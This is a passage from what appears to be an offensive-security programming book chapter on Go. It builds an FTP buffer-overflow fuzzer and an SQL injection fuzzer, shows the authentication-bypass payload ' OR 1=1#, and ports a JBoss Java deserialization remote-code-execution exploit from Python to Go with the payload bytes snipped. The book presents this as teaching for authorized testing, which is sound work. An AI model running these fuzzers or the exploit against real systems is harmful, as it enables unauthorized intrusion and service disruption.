<html><head></head><body><div id="sbo-rt-content"><h2 class="h2" id="ch9"><span epub:type="pagebreak" id="page_187"/><span class="big">9</span><br/>WRITING AND PORTING EXPLOIT CODE</h2>&#13;
<div class="imagel"><img src="Images/common.jpg" alt="Image" width="190" height="190"/></div>&#13;
<p class="snoindent">In the majority of the previous chapters, you used Go to create network-based attacks. You’ve explored raw TCP, HTTP, DNS, SMB, database interaction, and passive packet capturing.</p>&#13;
<p class="indent">This chapter focuses instead on identifying and exploiting vulnerabilities. First, you’ll learn how to create a vulnerability fuzzer to discover an application’s security weaknesses. Then you’ll learn how to port existing exploits to Go. Finally, we’ll show you how to use popular tools to create Go-friendly shellcode. By the end of the chapter, you should have a basic understanding of how to use Go to discover flaws while also using it to write and deliver various payloads.</p>&#13;
<h3 class="h3" id="ch9lev1sec1"><span epub:type="pagebreak" id="page_188"/>Creating a Fuzzer</h3>&#13;
<p class="noindent"><em>Fuzzing</em> is a technique that sends extensive amounts of data to an application in an attempt to force the application to produce abnormal behavior. This behavior can reveal coding errors or security deficiencies, which you can later exploit.</p>&#13;
<p class="indent">Fuzzing an application can also produce undesirable side effects, such as resource exhaustion, memory corruption, and service interruption. Some of these side effects are necessary for bug hunters and exploit developers to do their jobs but bad for the stability of the application. Therefore, it’s crucial that you always perform fuzzing in a controlled lab environment. As with most of the techniques we discuss in this book, don’t fuzz applications or systems without explicit authorization from the owner.</p>&#13;
<p class="indent">In this section, you’ll build two fuzzers. The first will check the capacity of an input in an attempt to crash a service and identify a buffer overflow. The second fuzzer will replay an HTTP request, cycling through potential input values to detect SQL injection.</p>&#13;
<h4 class="h4" id="ch9lev2sec1">Buffer Overflow Fuzzing</h4>&#13;
<p class="noindent"><em>Buffer overflows</em> occur when a user submits more data in an input than the application has allocated memory space for. For example, a user could submit 5,000 characters when the application expects to receive only 5. If a program uses the wrong techniques, this could allow the user to write that surplus data to parts of memory that aren’t intended for that purpose. This “overflow” corrupts the data stored within adjacent memory locations, allowing a malicious user to potentially crash the program or alter its logical flow.</p>&#13;
<p class="indent">Buffer overflows are particularly impactful for network-based programs that receive data from clients. Using buffer overflows, a client can disrupt server availability or possibly achieve remote code execution. It’s worth restating: don’t fuzz systems or applications unless you are permitted to do so. In addition, make sure you fully understand the consequences of crashing the system or service.</p>&#13;
<h5 class="h5">How Buffer Overflow Fuzzing Works</h5>&#13;
<p class="noindent">Fuzzing to create a buffer overflow generally involves submitting increasingly longer inputs, such that each subsequent request includes an input value whose length is one character longer than the previous attempt. A contrived example using the <em>A</em> character as input would execute according to the pattern shown in <a href="ch09.xhtml#ch19tab1">Table 9-1</a>.</p>&#13;
<p class="indent">By sending numerous inputs to a vulnerable function, you’ll eventually reach a point where the length of your input exceeds the function’s defined buffer size, which will corrupt the program’s control elements, such as its return and instruction pointers. At this point, the application or system will crash.</p>&#13;
<p class="indent">By sending incrementally larger requests for each attempt, you can precisely determine the expected input size, which is important for exploiting the application later. You can then inspect the crash or resulting core dump <span epub:type="pagebreak" id="page_189"/>to better understand the vulnerability and attempt to develop a working exploit. We won’t go into debugger usage and exploit development here; instead, let’s focus on writing the fuzzer.</p>&#13;
<p class="tabcap" id="ch19tab1"><strong>Table 9-1:</strong> Input Values in a Buffer Overflow Test</p>&#13;
<table class="topbot-d1">&#13;
<colgroup>&#13;
<col style="width:40%"/>&#13;
<col style="width:60%"/>&#13;
</colgroup>&#13;
<tbody>&#13;
<tr>&#13;
<td style="vertical-align: top;" class="table-h"><p class="taba"><strong>Attempt</strong></p></td>&#13;
<td style="vertical-align: top;" class="table-h"><p class="taba"><strong>Input value</strong></p></td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top;"><p class="taba">1</p></td>&#13;
<td style="vertical-align: top;"><p class="taba">A</p></td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top;" class="table-1b"><p class="taba">2</p></td>&#13;
<td style="vertical-align: top;" class="table-1b"><p class="taba">AA</p></td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top;"><p class="taba">3</p></td>&#13;
<td style="vertical-align: top;"><p class="taba">AAA</p></td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top;" class="table-1b"><p class="taba">4</p></td>&#13;
<td style="vertical-align: top;" class="table-1b"><p class="taba">AAAA</p></td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top;"><p class="taba"><em>N</em></p></td>&#13;
<td style="vertical-align: top;"><p class="taba">A repeated <em>N</em> times</p></td>&#13;
</tr>&#13;
</tbody>&#13;
</table>&#13;
<p class="indent">If you’ve done any manual fuzzing using modern, interpreted languages, you’ve probably used a construct to create strings of specific lengths. For example, the following Python code, run within the interpreter console, shows how simple it is to create a string of 25 <em>A</em> characters:</p>&#13;
<pre>&gt;&gt;&gt; <span class="codestrong1">x = "A"*25</span>&#13;
&gt;&gt;&gt; <span class="codestrong1">x</span>&#13;
'AAAAAAAAAAAAAAAAAAAAAAAAA'</pre>&#13;
<p class="indent">Unfortunately, Go has no such construct to conveniently build strings of arbitrary length. You’ll have to do that the old-fashioned way—using a loop—which would look something like this:</p>&#13;
<pre>var (&#13;
        n int&#13;
        s string&#13;
)&#13;
for n = 0; n &lt; 25; n++ {&#13;
    s += "A"&#13;
}</pre>&#13;
<p class="indent">Sure, it’s a little more verbose than the Python alternative, but not overwhelming.</p>&#13;
<p class="indent">The other consideration you’ll need to make is the delivery mechanism for your payload. This will depend on the target application or system. In some instances, this could involve writing a file to a disk. In other cases, you might communicate over TCP/UDP with an HTTP, SMTP, SNMP, FTP, Telnet, or other networked service.</p>&#13;
<p class="indent">In the following example, you’ll perform fuzzing against a remote FTP server. You can tweak a lot of the logic we present fairly quickly to operate against other protocols, so it should act as a good basis for you to develop custom fuzzers against other services.</p>&#13;
<p class="indent">Although Go’s standard packages include support for some common protocols, such as HTTP and SMTP, they don’t include support for client-server FTP interactions. Instead, you could use a third-party package that <span epub:type="pagebreak" id="page_190"/>already performs FTP communications, so you don’t have to reinvent the wheel and write something from the ground up. However, for maximum control (and to appreciate the protocol), you’ll instead build the basic FTP functionality using raw TCP communications. If you need a refresher on how this works, refer to <a href="ch02.xhtml#ch2">Chapter 2</a>.</p>&#13;
<h5 class="h5">Building The Buffer Overflow Fuzzer</h5>&#13;
<p class="noindent"><a href="ch09.xhtml#ch9list1">Listing 9-1</a> shows the fuzzer code. (All the code listings at the root location of / exist under the provided github repo <a href="https://github.com/blackhat-go/bhg/"><em>https://github.com/blackhat-go/bhg/</em></a>.) We’ve hardcoded some values, such as the target IP and port, as well as the maximum length of your input. The code itself fuzzes the <code>USER</code> property. Since this property occurs before a user is authenticated, it represents a commonly testable point on the attack surface. You could certainly extend this code to test other pre-authentication commands, such as <code>PASS</code>, but keep in mind that if you supply a legitimate username and then keep submitting inputs for <code>PASS</code>, you might get locked out eventually.</p>&#13;
<pre>func main() {&#13;
  <span class="ent">❶</span> for i := 0; i &lt; 2500; i++ {&#13;
      <span class="ent">❷</span> conn, err := net.Dial("tcp", "10.0.1.20:21")&#13;
         if err != nil {&#13;
          <span class="ent">❸</span> log.Fata lf("[!] Error at offset %d: %s\n", i, err)&#13;
         }  &#13;
      <span class="ent">❹</span> bufio.NewReader(conn).ReadString('\n')&#13;
&#13;
         user := ""&#13;
      <span class="ent">❺</span> for n := 0; n &lt;= i; n++ {&#13;
             user += "A"&#13;
          }  &#13;
&#13;
         raw := "USER %s\n"&#13;
      <span class="ent">❻</span> fmt.Fprintf(conn, raw, user)&#13;
         bufio.NewReader(conn).ReadString('\n')&#13;
&#13;
         raw = "PASS password\n"&#13;
         fmt.Fprint(conn, raw)&#13;
         bufio.NewReader(conn).ReadString('\n')&#13;
&#13;
         if err := conn.Close()<span class="ent">❼</span>; err != nil {&#13;
          <span class="ent">❽</span> log.Println("[!] Error at offset %d: %s\n", i, err)&#13;
         }  &#13;
    }  &#13;
}</pre>&#13;
<p class="caption" id="ch9list1"><em>Listing 9-1: A buffer overflow fuzzer (</em><a href="https://github.com/blackhat-go/bhg/tree/master/ch-9/ftp_fuzz/main.go">/ch-9/ftp-fuzz/main.go</a><em>)</em></p>&#13;
<p class="indent">The code is essentially one large loop, beginning at <span class="ent">❶</span>. Each time the program loops, it adds another character to the username you’ll supply. In this case, you’ll send usernames from 1 to 2,500 characters in length.</p>&#13;
<p class="indent">For each iteration of the loop, you establish a TCP connection to the destination FTP server <span class="ent">❷</span>. Any time you interact with the FTP service, <span epub:type="pagebreak" id="page_191"/>whether it’s the initial connection or the subsequent commands, you explicitly read the response from the server as a single line <span class="ent">❹</span>. This allows the code to block while waiting for the TCP responses so you don’t send your commands prematurely, before packets have made their round trip. You then use another <code>for</code> loop to build the string of <em>A</em>s in the manner we showed previously <span class="ent">❺</span>. You use the index <code>i</code> of the outer loop to build the string length dependent on the current iteration of the loop, so that it increases by one each time the program starts over. You use this value to write the <code>USER</code> command by using <code>fmt.Fprintf(conn, raw, user)</code> <span class="ent">❻</span>.</p>&#13;
<p class="indent">Although you could end your interaction with the FTP server at this point (after all, you’re fuzzing only the <code>USER</code> command), you proceed to send the <code>PASS</code> command to complete the transaction. Lastly, you close your connection cleanly <span class="ent">❼</span>.</p>&#13;
<p class="indent">It’s worth noting that there are two points, <span class="ent">❸</span> and <span class="ent">❽</span>, where abnormal connectivity behavior could indicate a service disruption, implying a potential buffer overflow: when the connection is first established and when the connection closes. If you can’t establish a connection the next time the program loops, it’s likely that something went wrong. You’ll then want to check whether the service crashed as a result of a buffer overflow.</p>&#13;
<p class="indent">If you can’t close a connection after you’ve established it, this may indicate the abnormal behavior of the remote FTP service abruptly disconnecting, but it probably isn’t caused by a buffer overflow. The anomalous condition is logged, but the program will continue.</p>&#13;
<p class="indent">A packet capture, illustrated in <a href="ch09.xhtml#ch9fig1">Figure 9-1</a>, shows that each subsequent <code>USER</code> command grows in length, confirming that your code works as desired.</p>&#13;
<div class="image"><img src="Images/09fig01.jpg" alt="Image" width="886" height="399"/></div>&#13;
<p class="figcap" id="ch9fig1"><em>Figure 9-1: A Wireshark capture depicting the <span class="codeitalic">USER</span> command growing by one letter each time the program loops</em></p>&#13;
<p class="indent">You could improve the code in several ways for flexibility and convenience. For example, you’d probably want to remove the hardcoded IP, port, and iteration values, and instead include them via command line arguments or a configuration file. We invite you to perform these usability updates as an exercise. Furthermore, you could extend the code so it fuzzes commands after authentication. Specifically, you could update the tool to fuzz the <code>CWD</code>/<code>CD</code> command. Various tools have historically been susceptible <span epub:type="pagebreak" id="page_192"/>to buffer overflows related to the handling of this command, making it a good target for fuzzing.</p>&#13;
<h4 class="h4" id="ch9lev2sec2">SQL Injection Fuzzing</h4>&#13;
<p class="noindent">In this section, you’ll explore SQL injection fuzzing. Instead of changing the length of each input, this variation on the attack cycles through a defined list of inputs to attempt to cause SQL injection. In other words, you’ll fuzz the username parameter of a website login form by attempting a list of inputs consisting of various SQL meta-characters and syntax that, if handled insecurely by the backend database, will yield abnormal behavior by the application.</p>&#13;
<p class="indent">To keep things simple, you’ll be probing only for error-based SQL injection, ignoring other forms, such as boolean-, time-, and union-based. That means that instead of looking for subtle differences in response content or response time, you’ll look for an error message in the HTTP response to indicate a SQL injection. This implies that you expect the web server to remain operational, so you can no longer rely on connection establishment as a litmus test for whether you’ve succeeded in creating abnormal behavior. Instead, you’ll need to search the response body for a database error message.</p>&#13;
<h5 class="h5">How SQL Injection Works</h5>&#13;
<p class="noindent">At its core, SQL injection allows an attacker to insert SQL meta-characters into a statement, potentially manipulating the query to produce unintended behavior or return restricted, sensitive data. The problem occurs when developers blindly concatenate untrusted user data to their SQL queries, as in the following pseudocode:</p>&#13;
<pre>username = HTTP_GET["username"]&#13;
query = "SELECT * FROM users WHERE user = '" + username + "'"&#13;
result = db.execute(query)&#13;
if(len(result) &gt; 0) {&#13;
    return AuthenticationSuccess()&#13;
} else {&#13;
    return AuthenticationFailed()&#13;
}</pre>&#13;
<p class="indent">In our pseudocode, the username variable is read directly from an HTTP parameter. The value of the username variable isn’t sanitized or validated. You then build a query string by using the value, concatenating it onto the SQL query syntax directly. The program executes the query against the database and inspects the result. If it finds at least one matching record, you’d consider the authentication successful. The code should behave appropriately so long as the supplied username consists of alphanumeric and a certain subset of special characters. For example, supplying a username of <code>alice</code> results in the following safe query:</p>&#13;
<pre>SELECT * FROM users WHERE user = 'alice'</pre>&#13;
<p class="indent"><span epub:type="pagebreak" id="page_193"/>However, what happens when the user supplies a username containing an apostrophe? Supplying a username of <code>o'doyle</code> produces the following query:</p>&#13;
<pre>SELECT * FROM users WHERE user = 'o'<span class="codestrong1">doyle'</span></pre>&#13;
<p class="indent">The problem here is that the backend database now sees an unbalanced number of single quotation marks. Notice the emphasized portion of the preceding query, <span class="codestrong1">doyle</span>; the backend database interprets this as SQL syntax, since it’s outside the enclosing quotes. This, of course, is invalid SQL syntax, and the backend database won’t be able to process it. For error-based SQL injection, this produces an error message in the HTTP response. The message itself will vary based on the database. In the case of MySQL, you’ll receive an error similar to the following, possibly with additional details disclosing the query itself:</p>&#13;
<pre>You have an error in your SQL syntax</pre>&#13;
<p class="indent">Although we won’t go too deeply into exploitation, you could now manipulate the username input to produce a valid SQL query that would bypass the authentication in our example. The username input <code>' OR 1=1#</code> does just that when placed in the following SQL statement:</p>&#13;
<pre>SELECT * FROM users WHERE user = '' OR 1=1#'</pre>&#13;
<p class="indent">This input appends a logical <code>OR</code> onto the end of the query. This <code>OR</code> statement always evaluates to true, because 1 always equals 1. You then use a MySQL comment (<code>#</code>) to force the backend database to ignore the remainder of the query. This results in a valid SQL statement that, assuming one or more rows exist in the database, you can use to bypass authentication in the preceding pseudocode example.</p>&#13;
<h5 class="h5">Building the SQL Injection Fuzzer</h5>&#13;
<p class="noindent">The intent of your fuzzer won’t be to generate a syntactically valid SQL statement. Quite the opposite. You’ll want to break the query such that the malformed syntax yields an error by the backend database, as the O’Doyle example just demonstrated. For this, you’ll send various SQL meta-characters as input.</p>&#13;
<p class="indent">The first order of business is to analyze the target request. By inspecting the HTML source code, using an intercepting proxy, or capturing network packets with Wireshark, you determine that the HTTP request submitted for the login portal resembles the following:</p>&#13;
<pre>POST /WebApplication/login.jsp HTTP/1.1&#13;
Host: 10.0.1.20:8080&#13;
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:54.0) Gecko/20100101 Firefox/54.0&#13;
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&#13;
Accept-Language: en-US,en;q=0.5&#13;
Accept-Encoding: gzip, deflate&#13;
Content-Type: application/x-www-form-urlencoded&#13;
<span epub:type="pagebreak" id="page_194"/>Content-Length: 35&#13;
Referer: http://10.0.1.20:8080/WebApplication/&#13;
Cookie: JSESSIONID=2D55A87C06A11AAE732A601FCB9DE571&#13;
Connection: keep-alive&#13;
Upgrade-Insecure-Requests: 1&#13;
&#13;
username=someuser&amp;password=somepass</pre>&#13;
<p class="indent">The login form sends a POST request to <em>http://10.0.1.20:8080/WebApplication/login.jsp</em>. There are two form parameters: <code>username</code> and <code>password</code>. For this example, we’ll limit the fuzzing to the <code>username</code> field for brevity. The code itself is fairly compact, consisting of a few loops, some regular expressions, and the creation of an HTTP request. It’s shown in <a href="ch09.xhtml#ch9list2">Listing 9-2</a>.</p>&#13;
<pre>func main() {&#13;
 <span class="ent">❶</span> payloads := []string{&#13;
        "baseline",&#13;
        ")",&#13;
        "(",&#13;
        "\"",&#13;
        "'",&#13;
    }  &#13;
&#13;
 <span class="ent">❷</span> sqlErrors := []string{&#13;
        "SQL",&#13;
        "MySQL",&#13;
        "ORA-",&#13;
        "syntax",&#13;
    }  &#13;
&#13;
    errRegexes := []*regexp.Regexp{}&#13;
    for _, e := range sqlErrors {&#13;
     <span class="ent">❸</span> re := regexp.MustCompile(fmt.Sprintf(".*%s.*", e))&#13;
        errRegexes = append(errRegexes, re)&#13;
    }  &#13;
&#13;
 <span class="ent">❹</span> for _, payload := range payloads {&#13;
        client := new(http.Client)&#13;
    <span class="ent">❺</span> body := []byte(fmt.Sprintf("username=%s&amp;password=p", payload))&#13;
    <span class="ent">❻</span> req, err := http.NewRequest(&#13;
           "POST",&#13;
           "http://10.0.1.20:8080/WebApplication/login.jsp",&#13;
           bytes.NewReader(body),&#13;
        )  &#13;
        if err != nil {&#13;
            log.Fatalf("[!] Unable to generate request: %s\n", err)&#13;
        }  &#13;
        req.Header.Add("Content-Type", "application/x-www-form-urlencoded")&#13;
        resp, err := client.Do(req)&#13;
        if err != nil {&#13;
            log.Fatalf("[!] Unable to process response: %s\n", err)&#13;
        }  &#13;
<span epub:type="pagebreak" id="page_195"/>     <span class="ent">❼</span> body, err = ioutil.ReadAll(resp.Body)&#13;
        if err != nil {&#13;
            log.Fatalf("[!] Unable to read response body: %s\n", err)&#13;
        }  &#13;
        resp.Body.Close()&#13;
&#13;
     <span class="ent">❽</span> for idx, re := range errRegexes {&#13;
         <span class="ent">❾</span> if re.MatchString(string(body)) {&#13;
                fmt.Printf(&#13;
                    "[+] SQL Error found ('%s') for payload: %s\n",&#13;
                    sqlErrors[idx],&#13;
                    payload,&#13;
                )&#13;
                break&#13;
            }  &#13;
        }  &#13;
    }  &#13;
}</pre>&#13;
<p class="caption" id="ch9list2"><em>Listing 9-2: A SQL injection fuzzer (</em><a href="https://github.com/blackhat-go/bhg/blob/master/ch-9/http_fuzz/main.go">/ch-9/http_fuzz/main.go</a><em>)</em></p>&#13;
<p class="indent">The code begins by defining a slice of payloads you want to attempt <span class="ent">❶</span>. This is your fuzzing list that you’ll supply later as the value of the <code>username</code> request parameter. In the same vein, you define a slice of strings that represent keywords within an SQL error message <span class="ent">❷</span>. These will be the values you’ll search for in the HTTP response body. The presence of any of these values is a strong indicator that an SQL error message is present. You could expand on both of these lists, but they’re adequate datasets for this example.</p>&#13;
<p class="indent">Next, you perform some preprocessing work. For each of the error keywords you wish to search for, you build and compile a regular expression <span class="ent">❸</span>. You do this work outside your main HTTP logic so you don’t have to create and compile these regular expressions multiple times, once for each payload. A minor optimization, no doubt, but good practice nonetheless. You’ll use these compiled regular expressions to populate a separate slice for use later.</p>&#13;
<p class="indent">Next comes the core logic of the fuzzer. You loop through each of the payloads <span class="ent">❹</span>, using each to build an appropriate HTTP request body whose <code>username</code> value is your current payload <span class="ent">❺</span>. You use the resulting value to build an HTTP POST request <span class="ent">❻</span>, targeting your login form. You then set the <code>Content-Type</code> header and send the request by calling <code>client.Do(req)</code>.</p>&#13;
<p class="indent">Notice that you send the request by using the long-form process of creating a client and an individual request and then calling <code>client.Do()</code>. You certainly could have used Go’s <code>http.PostForm()</code> function to achieve the same behavior more concisely. However, the more verbose technique gives you more granular control over HTTP header values. Although in this example you’re setting only the <code>Content-Type</code> header, it’s not uncommon to set additional header values when making HTTP requests (such as <code>User-Agent</code>, <code>Cookie</code>, and others). You can’t do this with <code>http.PostForm()</code>, so going the long route will make it easier to add any necessary HTTP headers in the future, particularly if you’re ever interested in fuzzing the headers themselves.</p>&#13;
<p class="indent"><span epub:type="pagebreak" id="page_196"/>Next, you read the HTTP response body by using <code>ioutil.ReadAll()</code> <span class="ent">❼</span>. Now that you have the body, you loop through all of your precompiled regular expressions <span class="ent">❽</span>, testing the response body for the presence of your SQL error keywords <span class="ent">❾</span>. If you get a match, you probably have a SQL injection error message. The program will log details of the payload and error to the screen and move onto the next iteration of the loop.</p>&#13;
<p class="indent">Run your code to confirm that it successfully identifies a SQL injection flaw in a vulnerable login form. If you supply the <code>username</code> value with a single quotation mark, you’ll get the error indicator <code>SQL,</code> as shown here:</p>&#13;
<pre>$ <span class="codestrong1">go run main.go</span>&#13;
[+] SQL Error found ('SQL') for payload: '</pre>&#13;
<p class="indent">We encourage you to try the following exercises to help you better understand the code, appreciate the nuances of HTTP communications, and improve your ability to detect SQL injection:</p>&#13;
<ol>&#13;
<li><p class="noindent">Update the code to test for time-based SQL injection. To do this, you’ll have to send various payloads that introduce a time delay when the backend query executes. You’ll need to measure the round-trip time and compare it against a baseline request to deduce whether SQL injection is present.</p></li>&#13;
<li><p class="noindent">Update the code to test for boolean-based blind SQL injection. Although you can use different indicators for this, a simple way is to compare the HTTP response code against a baseline response. A deviation from the baseline response code, particularly receiving a response code of 500 (internal server error), may be indicative of SQL injection.</p></li>&#13;
<li><p class="noindent">Rather than relying on Go’s <code>net.http</code> package to facilitate communications, try using the <code>net</code> package to dial a raw TCP connection. When using the <code>net</code> package, you’ll need to be aware of the <code>Content-Length</code> HTTP header, which represents the length of the message body. You’ll need to calculate this length correctly for each request because the body length may change. If you use an invalid length value, the server will likely reject the request.</p></li>&#13;
</ol>&#13;
<p class="indent">In the next section, we’ll show you how to port exploits to Go from other languages, such as Python or C.</p>&#13;
<h3 class="h3" id="ch9lev1sec2">Porting Exploits to Go</h3>&#13;
<p class="noindent">For various reasons, you may want to port an existing exploit to Go. Perhaps the existing exploit code is broken, incomplete, or incompatible with the system or version you wish to target. Although you could certainly extend or update the broken or incomplete code using the same language with which it was created, Go gives you the luxury of easy cross-compilation, consistent syntax and indentation rules, and a powerful standard library. All of this will make your exploit code arguably more portable and readable without compromising on features.</p>&#13;
<p class="indent"><span epub:type="pagebreak" id="page_197"/>Likely the most challenging task when porting an existing exploit is determining the equivalent Go libraries and function calls to achieve the same level of functionality. For example, addressing endianness, encoding, and encryption equivalents may take a bit of research, particularly for those who aren’t well versed in Go. Fortunately, we’ve addressed the complexity of network-based communications in previous chapters. The implementations and nuances of this should, hopefully, be familiar.</p>&#13;
<p class="indent">You’ll find countless ways to use Go’s standard packages for exploit development or porting. While it’s unrealistic for us to comprehensively cover these packages and use cases in a single chapter, we encourage you to explore Go’s official documentation at <em><a href="https://golang.org/pkg/">https://golang.org/pkg/</a></em>. The documentation is extensive, with an abundance of good examples to help you understand function and package usage. Here are just a few of the packages that will likely be of greatest interest to you when working with exploitation:</p>&#13;
<p class="noindentf"><span class="codestrong">bytes</span> Provides low-level byte manipulation</p>&#13;
<p class="noindentf"><span class="codestrong">crypto</span> Implements various symmetric and asymmetric ciphers and message authentication</p>&#13;
<p class="noindentf"><span class="codestrong">debug</span> Inspects various file type metadata and contents</p>&#13;
<p class="noindentf"><span class="codestrong">encoding</span> Encodes and decodes data by using various common forms such as binary, Hex, Base64, and more</p>&#13;
<p class="noindentf"><span class="codestrong">io</span> <span class="codestrong">and</span> <span class="codestrong">bufio</span> Reads and writes data from and to various common interface types including the file system, standard output, network connections, and more</p>&#13;
<p class="noindentf"><span class="codestrong">net</span> Facilitates client-server interaction by using various protocols such as HTTP and SMTP</p>&#13;
<p class="noindentf"><span class="codestrong">os</span> Executes and interacts with the local operating system</p>&#13;
<p class="noindentf"><span class="codestrong">syscall</span> Exposes an interface for making low-level system calls</p>&#13;
<p class="noindentf"><span class="codestrong">unicode</span> Encodes and decodes data by using UTF-16 or UTF-8</p>&#13;
<p class="noindentf"><span class="codestrong">unsafe</span> Useful for avoiding Go’s type safety checks when interacting with the operating system</p>&#13;
<p class="indent">Admittedly, some of these packages will prove to be more useful in later chapters, particularly when we discuss low-level Windows interactions, but we’ve included this list for your awareness. Rather than trying to cover these packages in detail, we’ll show you how to port an existing exploit by using some of these packages.</p>&#13;
<h4 class="h4" id="ch9lev2sec3">Porting an Exploit from Python</h4>&#13;
<p class="noindent">In this first example, you’ll port an exploit of the Java deserialization vulnerability released in 2015. The vulnerability, categorized under several CVEs, affects the deserialization of Java objects in common applications, servers, and libraries.<a id="rch9fn1" href="footnote.xhtml#ch9fn1"><sup>1</sup></a> This vulnerability is introduced by a deserialization <span epub:type="pagebreak" id="page_198"/>library that doesn’t validate input prior to server-side execution (a common cause of vulnerabilities). We’ll narrow our focus to exploiting JBoss, a popular Java Enterprise Edition application server. At <em><a href="https://github.com/roo7break/serialator/blob/master/serialator.py">https://github.com/roo7break/serialator/blob/master/serialator.py</a></em>, you’ll find a Python script that contains logic to exploit the vulnerability in multiple applications. <a href="ch09.xhtml#ch9list3">Listing 9-3</a> provides the logic you’ll replicate.</p>&#13;
<pre>def jboss_attack(HOST, PORT, SSL_On, _cmd):&#13;
    # The below code is based on the jboss_java_serialize.nasl script within Nessus&#13;
    """&#13;
    This function sets up the attack payload for JBoss&#13;
    """&#13;
    body_serObj = hex2raw3("ACED000573720032737<span class="codeitalic1">--SNIPPED FOR BREVITY--</span>017400") <span class="ent">❶</span>&#13;
   &#13;
    cleng = len(_cmd)&#13;
    body_serObj += chr(cleng) + _cmd <span class="ent">❷</span>&#13;
    body_serObj += hex2raw3("740004657865637571<span class="codeitalic1">--SNIPPED FOR BREVITY--</span>7E003A") <span class="ent">❸</span>&#13;
   &#13;
    if SSL_On: <span class="ent">❹</span>&#13;
        webservice = httplib2.Http(disable_ssl_certificate_validation=True)&#13;
        URL_ADDR = "%s://%s:%s" % ('https',HOST,PORT)&#13;
    else:&#13;
        webservice = httplib2.Http()&#13;
        URL_ADDR = "%s://%s:%s" % ('http',HOST,PORT)&#13;
    headers = {"User-Agent":"JBoss_RCE_POC", <span class="ent">❺</span>&#13;
            "Content-type":"application/x-java-serialized-object<span class="codeitalic1">--SNIPPED FOR BREVITY--</span>",&#13;
            "Content-length":"%d" % len(body_serObj)&#13;
        }&#13;
    resp, content = webservice.request<span class="ent">❻</span> (&#13;
        URL_ADDR+"/invoker/JMXInvokerServlet",&#13;
        "POST",&#13;
        body=body_serObj,&#13;
        headers=headers)&#13;
    # print provided response.&#13;
    print("[i] Response received from target: %s" % resp)</pre>&#13;
<p class="caption" id="ch9list3"><em>Listing 9-3: The Python serialization exploit code</em></p>&#13;
<p class="indent">Let’s take a look at what you’re working with here. The function receives a host, port, SSL indicator, and operating system command as parameters. To build the proper request, the function has to create a payload that represents a serialized Java object. This script starts by hardcoding a series of bytes onto a variable named <code>body_serObj</code> <span class="ent">❶</span>. These bytes have been snipped for brevity, but notice they are represented in the code as a string value. This is a hexadecimal string, which you’ll need to convert to a byte array so that two characters of the string become a single byte representation. For example, you’ll need to convert <code>AC</code> to the hexadecimal byte <code>\xAC</code>. To accomplish this conversion, the exploit code calls a function named <code>hex2raw3</code>. Details of this function’s underlying implementation are inconsequential, so long as you understand what’s happening to the hexadecimal string.</p>&#13;
<p class="indent"><span epub:type="pagebreak" id="page_199"/>Next, the script calculates the length of the operating system command, and then appends the length and command to the <code>body_serObj</code> variable <span class="ent">❷</span>. The script completes the construction of the payload by appending additional data that represents the remainder of your Java serialized object in a format that JBoss can process <span class="ent">❸</span>. Once the payload is constructed, the script builds the URL and sets up SSL to ignore invalid certificates, if necessary <span class="ent">❹</span>. It then sets the required <code>Content-Type</code> and <code>Content-Length</code> HTTP headers <span class="ent">❺</span> and sends the malicious request to the target server <span class="ent">❻</span>.</p>&#13;
<p class="indent">Most of what’s presented in this script shouldn’t be new to you, as we’ve covered the majority of it in previous chapters. It’s now just a matter of making the equivalent function calls in a Go friendly manner. <a href="ch09.xhtml#ch9list4">Listing 9-4</a> shows the Go version of the exploit.</p>&#13;
<pre>func jboss(host string, ssl bool, cmd string) (int, error) {&#13;
    serializedObject, err := hex.DecodeString("ACED0005737<span class="codeitalic1">--SNIPPED FOR BREVITY--</span>017400") <span class="ent">❶</span>&#13;
    if err != nil {&#13;
        return 0, err&#13;
    }&#13;
    serializedObject = append(serializedObject, byte(len(cmd)))&#13;
    serializedObject = append(serializedObject, []byte(cmd)...) <span class="ent">❷</span>&#13;
    afterBuf, err := hex.DecodeString("740004657865637571<span class="codeitalic1">--SNIPPED FOR BREVITY--</span>7E003A") <span class="ent">❸</span>&#13;
    if err != nil {&#13;
        return 0, err&#13;
    }&#13;
    serializedObject = append(serializedObject, afterBuf...)&#13;
&#13;
    var client *http.Client&#13;
    var url string&#13;
    if ssl { <span class="ent">❹</span>&#13;
        client = &amp;http.Client{&#13;
            Transport: &amp;http.Transport{&#13;
                TLSClientConfig: &amp;tls.Config{&#13;
                    InsecureSkipVerify: true,&#13;
                },&#13;
            },&#13;
        }&#13;
        url = fmt.Sprintf("https://%s/invoker/JMXInvokerServlet", host)&#13;
    } else {&#13;
        client = &amp;http.Client{}&#13;
        url = fmt.Sprintf("http://%s/invoker/JMXInvokerServlet", host)&#13;
    }&#13;
&#13;
    req, err := http.NewRequest("POST", url, bytes.NewReader(serializedObject))&#13;
    if err != nil {&#13;
        return 0, err&#13;
    }&#13;
    req.Header.Set( <span class="ent">❺</span>&#13;
        "User-Agent",&#13;
        "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko")&#13;
    req.Header.Set(&#13;
        "Content-Type",&#13;
        "application/x-java-serialized-object; class=org.jboss.invocation.MarshalledValue")&#13;
<span epub:type="pagebreak" id="page_200"/>    resp, err := client.Do(req) <span class="ent">❻</span>&#13;
    if err != nil {&#13;
        return 0, err&#13;
    }&#13;
    return resp.StatusCode, nil&#13;
}</pre>&#13;
<p class="caption" id="ch9list4"><em>Listing 9-4: The Go equivalent of the original Python serialization exploit (</em><a href="https://github.com/blackhat-go/bhg/blob/master/ch-9/jboss/main.go">/ch-9/jboss/main.go</a><em>)</em></p>&#13;
<p class="indent">The code is nearly a line-by-line reproduction of the Python version. For this reason, we’ve set the annotations to align with their Python counterparts, so you’ll be able to follow the changes we’ve made.</p>&#13;
